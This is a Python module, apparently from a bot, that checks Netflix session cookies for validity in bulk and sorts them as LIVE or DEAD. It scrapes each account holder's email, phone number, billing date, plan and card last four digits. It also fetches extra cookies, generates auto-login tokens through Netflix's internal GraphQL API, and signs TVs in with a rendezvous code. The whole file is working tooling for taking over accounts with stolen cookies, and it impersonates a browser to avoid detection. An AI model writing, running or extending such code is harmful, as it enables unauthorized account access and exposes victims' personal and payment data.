"""
Netflix cookie checker and NFToken generator.

This module follows the same extraction flow as net_fixed.py:
- robust account parsing from /account
- profile recovery from /browse
- resilient cookie parsing from mixed input formats
"""

import json
import logging
import re
import threading
from datetime import datetime
from html import unescape
from urllib.parse import unquote

from curl_cffi import requests as curl_requests

logger = logging.getLogger("NetflixBot")

REQUEST_TIMEOUT = (10, 30)
thread_local = threading.local()

_CHECK_LOCK = threading.Lock()  # Chỉ check 1 cookie tại 1 thời điểm


def _create_session():
    session = curl_requests.Session(impersonate="chrome120")
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    })
    return session


def get_session():
    if not hasattr(thread_local, "session"):
        thread_local.session = _create_session()
    return thread_local.session


def _fix_js_escapes(text):
    r"""Convert JS \xXX and \uXXXX escapes into real characters."""
    def _hex_replace(match):
        try:
            return chr(int(match.group(1), 16))
        except Exception:
            return match.group(0)

    def _unicode_replace(match):
        try:
            return chr(int(match.group(1), 16))
        except Exception:
            return match.group(0)

    text = re.sub(r"\\x([0-9a-fA-F]{2})", _hex_replace, text)
    text = re.sub(r"\\u([0-9a-fA-F]{4})", _unicode_replace, text)
    return text


def decode_response(raw_html):
    html = unescape(raw_html or "")
    return bytes(html, "utf-8").decode("raw_unicode_escape", errors="ignore")


def _prepare_json_text(text):
    r"""Convert \xXX escapes to JSON-safe \u00XX."""
    return re.sub(r"\\x([0-9a-fA-F]{2})", r"\\u00\1", text)


def _extract_json_obj(text, key):
    """Best-effort extraction of a JSON object starting near key marker."""
    idx = text.find(key)
    if idx == -1:
        return None

    start = text.find("{", idx)
    if start == -1:
        return None

    depth = 0
    for i in range(start, min(len(text), start + 200000)):
        ch = text[i]
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                raw = text[start:i + 1]
                try:
                    return json.loads(raw)
                except Exception:
                    pass
                try:
                    return json.loads(_prepare_json_text(raw))
                except Exception:
                    return None
    return None


def _clean_val(val):
    if not isinstance(val, str):
        return val
    if "\\x" in val or "\\u" in val:
        try:
            val = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), val)
            val = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), val)
        except Exception:
            pass
    return val


def _find_authurl(decoded_html):
    for pat in (
        r'"authURL"\s*:\s*"([^"]+)"',
        r'authURL\\":\\"([^"\\]+)\\"',
        r'authURL\s*=\s*"([^"]+)"',
    ):
        m = re.search(pat, decoded_html)
        if m:
            return _clean_val(m.group(1))
    return "-"


def _extract_all_json_blobs(html):
    blobs = []
    for script_match in re.finditer(r"<script[^>]*>(.*?)</script>", html, re.DOTALL):
        script = script_match.group(1).strip()
        if not script or len(script) < 30:
            continue

        for assign in re.finditer(r"(?:var\s+\w+|window\.\w+|\w+)\s*=\s*(\{.+)", script, re.DOTALL):
            txt = assign.group(1)
            depth = 0
            for i, ch in enumerate(txt):
                if ch == "{":
                    depth += 1
                elif ch == "}":
                    depth -= 1
                    if depth == 0:
                        try:
                            blobs.append(json.loads(txt[:i + 1]))
                        except Exception:
                            pass
                        break

        if script.startswith("{"):
            try:
                blobs.append(json.loads(script))
            except Exception:
                pass
    return blobs


def _deep_search(obj, keys, results=None, depth=0):
    if results is None:
        results = {}
    if depth > 15:
        return results

    if isinstance(obj, dict):
        for key, value in obj.items():
            if key in keys and value and key not in results:
                results[key] = value
            if isinstance(value, (dict, list)):
                _deep_search(value, keys, results, depth + 1)
    elif isinstance(obj, list):
        for item in obj:
            if isinstance(item, (dict, list)):
                _deep_search(item, keys, results, depth + 1)
    return results


_MONTH_NAME_TO_NUM = {
    "january": 1, "jan": 1,
    "enero": 1, "gennaio": 1, "janeiro": 1,
    "february": 2, "feb": 2,
    "febrero": 2, "fevereiro": 2, "febbraio": 2,
    "march": 3, "mar": 3,
    "marzo": 3, "marco": 3,
    "april": 4, "apr": 4,
    "abril": 4, "aprile": 4,
    "may": 5, "mayo": 5, "maio": 5, "maggio": 5,
    "june": 6, "jun": 6, "junio": 6, "junho": 6, "giugno": 6,
    "july": 7, "jul": 7, "julio": 7, "julho": 7, "luglio": 7,
    "august": 8, "aug": 8, "agosto": 8,
    "september": 9, "sep": 9, "sept": 9,
    "septiembre": 9, "setiembre": 9, "setembro": 9,
    "october": 10, "oct": 10, "octubre": 10, "outubro": 10, "ottobre": 10,
    "november": 11, "nov": 11, "noviembre": 11, "novembro": 11,
    "december": 12, "dec": 12, "diciembre": 12, "dezembro": 12, "dicembre": 12,
}


def _normalize_date_text(text):
    s = str(text or "").strip().lower()
    s = s.replace("\\", " ")
    for src, dst in (
        ("á", "a"), ("à", "a"), ("â", "a"), ("ä", "a"),
        ("é", "e"), ("è", "e"), ("ê", "e"), ("ë", "e"),
        ("í", "i"), ("ì", "i"), ("î", "i"), ("ï", "i"),
        ("ó", "o"), ("ò", "o"), ("ô", "o"), ("ö", "o"),
        ("ú", "u"), ("ù", "u"), ("û", "u"), ("ü", "u"),
        ("ñ", "n"), ("ç", "c"),
    ):
        s = s.replace(src, dst)
    return re.sub(r"\s+", " ", s).strip()


def _parse_billing_date_key(value):
    raw = _clean_val(value)
    if not isinstance(raw, str):
        return None
    text = _normalize_date_text(raw)
    if not text:
        return None

    m = re.search(r"(\d{4})-(\d{2})-(\d{2})", text)
    if m:
        return int(m.group(1)), int(m.group(2)), int(m.group(3))

    m = re.search(r"(\d{1,2})\s*(?:de\s+)?([a-z]+)\s*(?:de\s+)?(\d{4})", text)
    if m:
        day = int(m.group(1))
        month_name = m.group(2)
        year = int(m.group(3))
        month = _MONTH_NAME_TO_NUM.get(month_name)
        if month:
            return year, month, day

    m = re.search(r"([a-z]+)\s+(\d{1,2}),?\s*(\d{4})", text)
    if m:
        month_name = m.group(1)
        day = int(m.group(2))
        year = int(m.group(3))
        month = _MONTH_NAME_TO_NUM.get(month_name)
        if month:
            return year, month, day

    return None


def _pick_best_billing(candidates):
    def _clean_billing_text(v):
        return re.sub(r"\s+", " ", str(v).replace("\\", " ")).strip()

    values = []
    seen = set()
    for c in candidates or []:
        if not isinstance(c, str):
            continue
        v = _clean_billing_text(_clean_val(c))
        if not v or v == "-":
            continue
        key = v.lower()
        if key in seen:
            continue
        seen.add(key)
        values.append(v)

    if not values:
        return "-"

    ranked = []
    for idx, value in enumerate(values):
        parsed = _parse_billing_date_key(value)
        if parsed:
            ranked.append((parsed, idx, value))

    if ranked:
        ranked.sort(key=lambda x: (x[0], x[1]))
        return _clean_billing_text(ranked[-1][2])

    return _clean_billing_text(values[-1])


def parse_account_info(decoded_html):
    """Simple parser like app.py (minimal checks, stable extraction)."""
    decoded_html_norm = decoded_html.replace('\\"', '"')
    result = {
        "status": "LIVE",
        "plan": "-",
        "price": "-",
        "billing": "-",
        "videoQuality": "-",
        "maxStreams": "-",
        "paymentType": "-",
        "last4": "-",
        "displayName": "-",
        "owner": "-",
        "email": "-",
        "country": "-",
        "membershipStatus": "-",
        "memberSince": "-",
        "phone": "-",
        "phoneNumber": "-",
        "phoneNumberVerified": False,
        "profiles": "-",
        "numProfiles": 0,
        "numKidsProfiles": 0,
        "extraMembers": False,
        "authURL": "-",
    }

    plan_match = re.search(
        r'"currentPlan":\{"fieldType":"Group","fieldGroup":"MemberPlan","fields":\{"localizedPlanName":\{"fieldType":"String","value":"(.*?)"\}',
        decoded_html,
    )
    if plan_match:
        result["plan"] = _clean_val(plan_match.group(1))

    billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if not billing_match:
        billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"(.*?)"\}', decoded_html_norm)
    if billing_match:
        result["billing"] = re.sub(r"\s+", " ", str(_clean_val(billing_match.group(1))).replace("\\", " ")).strip()
    if result["billing"] == "-":
        for source in (decoded_html, decoded_html_norm):
            for pat in (
                r'"nextBillingDate"\s*:\s*"([^"]+)"',
                r'"nextBillingDate"\s*:\s*\{[\s\S]{0,500}?"value"\s*:\s*"([^"]+)"',
            ):
                m = re.search(pat, source)
                if m:
                    result["billing"] = re.sub(r"\s+", " ", str(_clean_val(m.group(1))).replace("\\", " ")).strip()
                    break
            if result["billing"] != "-":
                break

    member_since_match = re.search(
        r'"memberSince"\s*:\s*"(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d+Z)"',
        decoded_html,
    )
    if member_since_match:
        try:
            dt = datetime.strptime(member_since_match.group(1), "%Y-%m-%dT%H:%M:%S.%fZ")
            result["memberSince"] = f"{dt.day} {dt.strftime('%B %Y')}"
        except Exception:
            pass

    phone_number_match = re.search(
        r'"growthPhoneNumber"\s*:\s*\{[^}]*"isVerified"\s*:\s*(true|false|null),\s*"phoneNumberDigits"\s*:\s*(null|\{[^}]*"value"\s*:\s*"([^"]*)"\})',
        decoded_html,
    )
    if phone_number_match:
        is_verified_str = phone_number_match.group(1)
        phone_number_block = phone_number_match.group(2)
        phone_number_value = phone_number_match.group(3)
        if phone_number_block == "null" or phone_number_value is None:
            result["phoneNumber"] = "No Phone Number"
            result["phoneNumberVerified"] = False
        else:
            result["phoneNumber"] = _clean_val(phone_number_value)
            result["phoneNumberVerified"] = is_verified_str == "true"
    else:
        result["phoneNumber"] = "NOT FOUND"
        result["phoneNumberVerified"] = False

    quality_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if quality_match:
        result["videoQuality"] = _clean_val(quality_match.group(1))

    stream_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', decoded_html)
    if stream_match:
        result["maxStreams"] = stream_match.group(1)

    pay_type_match = re.search(r'"type":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if pay_type_match:
        result["paymentType"] = _clean_val(pay_type_match.group(1))

    last4_match = re.search(r'"displayText":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if last4_match:
        result["last4"] = _clean_val(last4_match.group(1))
    if result["last4"] == "-":
        m_last4 = re.search(r'"last4"\s*:\s*"?(\d{4})"?', decoded_html)
        if m_last4:
            result["last4"] = m_last4.group(1)

    acc_info = re.search(r'"accountInfo":\{"data":\{(.*?)\}\s*,\s*"type":"api"\}', decoded_html, re.DOTALL)
    if acc_info:
        block = acc_info.group(1)
        name = re.search(r'"displayName":"(.*?)"', block)
        if name:
            result["displayName"] = _clean_val(name.group(1))
        email = re.search(r'"emailAddress":"(.*?)"', block)
        if email:
            result["email"] = _clean_val(email.group(1))
        country = re.search(r'"country":"(.*?)"', block)
        if country:
            result["country"] = country.group(1)
        status = re.search(r'"membershipStatus":"(.*?)"', block)
        if status:
            result["membershipStatus"] = _clean_val(status.group(1))

    # userInfo fallback
    user_obj = _extract_json_obj(decoded_html, '"userInfo"')
    if isinstance(user_obj, dict):
        if result["displayName"] == "-":
            result["displayName"] = _clean_val(user_obj.get("name") or user_obj.get("displayName") or "-")
        if result["email"] == "-" and user_obj.get("emailAddress"):
            result["email"] = _clean_val(user_obj.get("emailAddress"))
        if result["country"] == "-":
            cc = user_obj.get("currentCountry") or user_obj.get("countryOfSignup")
            if cc:
                result["country"] = _clean_val(cc)
        if result["membershipStatus"] == "-" and user_obj.get("membershipStatus"):
            result["membershipStatus"] = _clean_val(user_obj.get("membershipStatus"))
        if result["memberSince"] == "-" and user_obj.get("memberSince"):
            result["memberSince"] = _clean_val(user_obj.get("memberSince"))
        if user_obj.get("authURL"):
            result["authURL"] = _clean_val(user_obj.get("authURL"))

    # generic fallbacks
    if result["email"] == "-":
        m = re.search(r'"emailAddress"\s*:\s*"([^"]+?(?:@|\\x40)[^"]+)"', decoded_html, re.IGNORECASE)
        if m:
            result["email"] = _clean_val(m.group(1))

    if result["country"] == "-":
        m = re.search(r'"currentCountry"\s*:\s*"([A-Z]{2})"', decoded_html)
        if not m:
            m = re.search(r'"countryOfSignup"\s*:\s*"([A-Z]{2})"', decoded_html)
        if m:
            result["country"] = m.group(1)

    if result["membershipStatus"] == "-":
        m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', decoded_html)
        if m:
            result["membershipStatus"] = _clean_val(m.group(1))

    if result["memberSince"] == "-":
        m = re.search(r'"memberSince"\s*:\s*"([^"]+)"', decoded_html)
        if m:
            result["memberSince"] = _clean_val(m.group(1))

    if result["authURL"] == "-":
        result["authURL"] = _find_authurl(decoded_html)

    result["owner"] = result["displayName"]
    if result["phone"] == "-" and result["phoneNumber"] != "-":
        result["phone"] = result["phoneNumber"]

    # keep profile output simple and predictable
    if result["profiles"] == "-" and result["displayName"] not in ("-", ""):
        result["profiles"] = result["displayName"]
        result["numProfiles"] = 1

    # ═══ VALIDATION: Detect dead cookies ═══
    # Chỉ check membershipStatus trước - đây là field tin cậy nhất
    membership = result.get("membershipStatus", "").upper()
    
    # Các trạng thái chắc chắn DEAD
    if membership in ("FORMER_MEMBER", "NEVER_MEMBER", "NON_MEMBER", "ANONYMOUS"):
        logger.info(f"Cookie DEAD - membershipStatus: {membership}")
        result["status"] = "DEAD"
        return result
    
    # Nếu membershipStatus là CURRENT_MEMBER → chắc chắn LIVE
    if membership == "CURRENT_MEMBER":
        return result
    
    # Nếu có bất kỳ thông tin account nào (plan, email, country, profile...) → LIVE
    has_any_info = any(
        result.get(f) not in ("-", "", None, "NOT FOUND", "No Phone Number")
        for f in ("plan", "email", "country", "displayName", "billing", "authURL")
    )
    if has_any_info:
        return result  # Có thông tin → LIVE
    
    # Không có membershipStatus rõ ràng VÀ không có thông tin gì → DEAD
    logger.info(f"Cookie appears DEAD - no valid account information found (membership={membership})")
    result["status"] = "DEAD"
    return result


def fetch_extra_account_info(cookies):
    session = get_session()
    extra = {}
    try:
        r = session.get(
            "https://www.netflix.com/browse",
            cookies=cookies,
            allow_redirects=True,
            timeout=REQUEST_TIMEOUT,
        )
        if r.status_code == 200:
            decoded_browse = decode_response(r.text or "")
            profile_names = re.findall(r'"profileName"\s*:\s*"([^"]+)"', decoded_browse)
            if profile_names:
                unique_profiles = list(dict.fromkeys(_clean_val(p) for p in profile_names))
                extra["profiles"] = ", ".join(unique_profiles)
                extra["numProfiles"] = len(unique_profiles)

            np_match = re.search(r'"numProfiles"\s*:\s*(\d+)', decoded_browse)
            if np_match:
                parsed_num = int(np_match.group(1))
                extra["numProfiles"] = max(extra.get("numProfiles", 0), parsed_num)
    except Exception:
        pass
    return extra


def _is_login_redirect(url_or_location):
    path = (url_or_location or "").lower()
    if "netflix.com" in path:
        idx = path.find("netflix.com")
        path = path[idx + len("netflix.com"):]
    stripped = re.sub(r"^/[a-z]{2}(-[a-z]{2,4})?/", "/", path)
    return stripped.startswith("/login")


def _is_account_page(url_or_location):
    path = (url_or_location or "").lower()
    if "netflix.com" in path:
        idx = path.find("netflix.com")
        path = path[idx + len("netflix.com"):]
    stripped = re.sub(r"^/[a-z]{2}(-[a-z]{2,4})?/", "/", path)
    return "/account" in stripped or "/youraccount" in stripped


def _parse_cookie_input(raw):
    decoded = unquote((raw or "").strip())
    netflix_id = None
    secure_id = None
    extras = {}

    netflix_match = re.search(r"NetflixId=([^;\s]+)", decoded)
    secure_match = re.search(r"SecureNetflixId=([^;\s]+)", decoded)
    nfvdid_match = re.search(r"nfvdid=([^;\s]+)", decoded)

    if netflix_match:
        netflix_id = netflix_match.group(1).strip()
    if secure_match:
        secure_id = secure_match.group(1).strip()
    if nfvdid_match:
        extras["nfvdid"] = nfvdid_match.group(1).strip()

    if netflix_id is None:
        parts = [p.strip() for p in decoded.split("|")]
        if parts and parts[0]:
            netflix_id = parts[0]
        if len(parts) > 1 and parts[1] and not secure_id:
            secure_id = parts[1]
        for part in parts[2:]:
            if "=" in part:
                key, value = part.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    extras[key] = value

    if secure_id is None:
        secure_pipe = re.search(r"(?:^|\|)\s*SecureNetflixId=([^|;\s]+)", decoded)
        if secure_pipe:
            secure_id = secure_pipe.group(1).strip()

    if netflix_id:
        netflix_id = netflix_id.strip()
    if secure_id:
        secure_id = secure_id.strip()

    return netflix_id, secure_id, extras


def parse_cookie_line(raw_line):
    """Parse cookie input into (netflix_id, secure_id, extras_dict)."""
    netflix_id, secure_id, extras = _parse_cookie_input(raw_line)

    if not netflix_id:
        return None, None, {}

    if netflix_id in {"1", "2", "3", "4"}:
        return None, None, {}

    return netflix_id, secure_id, extras


def check_cookie(netflix_id, secure_id=None, extra_cookies=None):
    """Check cookie status - matched with net_fixed.py logic for accuracy."""
    if not netflix_id:
        return {"status": "ERROR", "error": "Missing NetflixId"}

    url = "https://www.netflix.com/account"
    cookies = {"NetflixId": netflix_id}
    if secure_id:
        cookies["SecureNetflixId"] = secure_id
    if extra_cookies:
        cookies.update(extra_cookies)

    # Tạo session MỚI cho mỗi lần check (giống net_fixed.py)
    session = _create_session()

    try:
        r = session.get(url, cookies=cookies, allow_redirects=True, timeout=REQUEST_TIMEOUT)

        # Collect all cookies from response
        all_cookies = dict(cookies)
        try:
            for name, cookie in r.cookies.items():
                all_cookies[name] = getattr(cookie, "value", cookie)
        except Exception:
            pass

        # DEAD: final URL chứa "login" nhưng KHÔNG chứa "account"
        # (cùng logic với net_fixed.py)
        final_url = str(getattr(r, 'url', '') or '').lower()
        if "login" in final_url and "account" not in final_url:
            return {"status": "DEAD"}

        # Parse the page
        decoded = decode_response(r.text or "")
        info = parse_account_info(decoded)

        # Nếu parse_account_info đã phát hiện DEAD thì return luôn
        if info.get("status") == "DEAD":
            return info

        # DEAD: account has no active membership (giống net_fixed.py)
        membership = info.get("membershipStatus", "-")
        if membership in ("ANONYMOUS", "FORMER_MEMBER", "NON_MEMBER", "NEVER_MEMBER"):
            return {"status": "DEAD"}

        # Extract nfvdid
        nfvdid_match = re.search(r'"nfvdid"\s*:\s*"([^"]+)"', decoded)
        if nfvdid_match and "nfvdid" not in all_cookies:
            all_cookies["nfvdid"] = nfvdid_match.group(1)
        if "nfvdid" not in all_cookies:
            nfvdid_match2 = re.search(r"nfvdid=([^;\s\"]+)", decoded)
            if nfvdid_match2:
                all_cookies["nfvdid"] = nfvdid_match2.group(1)

        info["_cookies"] = all_cookies
        return info

    except Exception as e:
        logger.warning(f"check_cookie error: {e}")
        return {"status": "ERROR", "error": str(e)}


def fetch_missing_cookies(netflix_id):
    """
    Crawl Netflix pages to collect missing cookies like SecureNetflixId / nfvdid.
    """
    sess = curl_requests.Session(impersonate="chrome120", timeout=30)
    mobile_headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"iOS"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
    }
    try:
        sess.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
        for url in (
            "https://www.netflix.com/",
            "https://www.netflix.com/login",
            "https://www.netflix.com/SignIn",
            "https://www.netflix.com/vn-en/login",
        ):
            sess.get(url, headers=mobile_headers, allow_redirects=True)
            if sess.cookies.get("SecureNetflixId") and sess.cookies.get("nfvdid"):
                break

        pulled = {
            "NetflixId": netflix_id,
            "nfvdid": sess.cookies.get("nfvdid"),
            "SecureNetflixId": sess.cookies.get("SecureNetflixId"),
            "gsid": sess.cookies.get("gsid"),
        }
        return {k: v for k, v in pulled.items() if v}
    except Exception as e:
        logger.error("Error fetching missing cookies: %s", e)
        return {}


def generate_nftoken(cookie_dict):
    """
    Generate NFToken via Netflix GraphQL API.
    Returns (token_string, error_string).
    """
    required = ["NetflixId", "SecureNetflixId", "nfvdid"]
    missing = [c for c in required if not cookie_dict.get(c)]

    if missing and cookie_dict.get("NetflixId"):
        fetched = fetch_missing_cookies(cookie_dict["NetflixId"])
        cookie_dict.update(fetched)
        missing = [c for c in required if not cookie_dict.get(c)]

    if missing:
        return None, f"Missing: {', '.join(missing)}"

    cookie_parts = [f"{k}={v}" for k, v in cookie_dict.items() if v]
    cookie_str = "; ".join(cookie_parts)

    payload = {
        "operationName": "CreateAutoLoginToken",
        "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
        "extensions": {
            "persistedQuery": {
                "version": 102,
                "id": "76e97129-f4b5-41a0-a73c-12e674896849",
            }
        },
    }

    headers = {
        "User-Agent": "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)",
        "Accept": "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
        "Content-Type": "application/json",
        "Origin": "https://www.netflix.com",
        "Referer": "https://www.netflix.com/",
        "Cookie": cookie_str,
    }

    api_url = "https://android13.prod.ftl.netflix.com/graphql"
    session = get_session()

    payloads = [
        payload,
        {
            "operationName": "CreateAutoLoginToken",
            "variables": {"scope": "WEB_STREAMING"},
            "extensions": payload["extensions"],
        },
        {
            "operationName": "CreateAutoLoginToken",
            "variables": {"scope": "MOBILE_STREAMING"},
            "extensions": payload["extensions"],
        },
    ]

    last_err = "Invalid response"
    try:
        for body in payloads:
            response = session.post(api_url, headers=headers, json=body, timeout=REQUEST_TIMEOUT)
            if response.status_code != 200:
                last_err = f"HTTP {response.status_code}"
                continue

            data = response.json()
            if data.get("data") and data["data"].get("createAutoLoginToken"):
                token_obj = data["data"]["createAutoLoginToken"]
                if isinstance(token_obj, dict):
                    token = (
                        token_obj.get("tokenValue")
                        or token_obj.get("token")
                        or token_obj.get("nftoken")
                        or str(token_obj)
                    )
                else:
                    token = str(token_obj)
                if token and token != "{}":
                    return token, None

            if data.get("errors"):
                err_msg = data["errors"][0].get("message", "Unknown")
                last_err = f"API Error: {err_msg}"
                if "access denied" in err_msg.lower():
                    break
            else:
                last_err = "Invalid response"

        return None, last_err
    except Exception as e:
        return None, str(e)


def tv_login_with_code(auth_url, tv_code, cookies):
    """
    Perform TV login flow against https://www.netflix.com/tv8 using a rendezvous code.
    Returns (success_bool, message).
    """
    if not auth_url or not tv_code:
        return False, "Missing authURL or TV_CODE"

    url = "https://www.netflix.com/tv8"
    headers = {
        "host": "www.netflix.com",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.netflix.com",
        "priority": "u=0, i",
        "referer": "https://www.netflix.com/tv8",
        "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-model": "\"\"",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-ch-ua-platform-version": "\"10.0.0\"",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    }
    data = {
        "flow": "websiteSignUp",
        "authURL": auth_url,
        "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2",
        "code": tv_code,
        "tvLoginRendezvousCode": tv_code,
        "action": "nextAction",
    }

    session = get_session()
    try:
        # Do NOT follow redirects: 302 to /tv/out/success means success.
        r = session.post(
            url,
            headers=headers,
            data=data,
            cookies=cookies,
            allow_redirects=False,
            timeout=REQUEST_TIMEOUT,
        )

        location = r.headers.get("Location", "")

        if r.status_code in (301, 302) and "/tv/out/success" in location:
            return True, "TV login SUCCESS"
        if r.status_code in (301, 302):
            return False, f"Redirect to: {location}"

        # HTTP 200 still on TV8 page => likely error.
        txt = r.text or ""

        def _clean_error(raw):
            s = str(raw or "")
            s = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), s)
            s = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), s)
            s = unescape(s)
            s = re.sub(r"<[^>]+>", "", s)
            return s.strip()

        # 1) JSON error payload.
        err_code_m = re.search(r'"errorCode"\s*:\s*"([^"]+)"', txt)
        err_msg_m = re.search(r'"errorMessage"\s*:\s*"([^"]+)"', txt)
        if err_code_m:
            code = _clean_error(err_code_m.group(1))
            msg = _clean_error(err_msg_m.group(1)) if err_msg_m else ""
            if msg and ("{errorCode}" in msg or "{" in msg):
                msg = ""
            return False, f"{code}: {msg}" if msg else code

        # 2) HTML error blocks.
        for pat in (
            r'data-uia="UIMessage-content">(.*?)</\s*\w',
            r'class="ui-message-contents"[^>]*>(.*?)</\s*\w',
        ):
            m = re.search(pat, txt, re.DOTALL)
            if m:
                cleaned = _clean_error(m.group(1))
                if cleaned and "{" not in cleaned:
                    return False, cleaned

        return False, "TV code not accepted or expired"
    except Exception as e:
        return False, str(e)


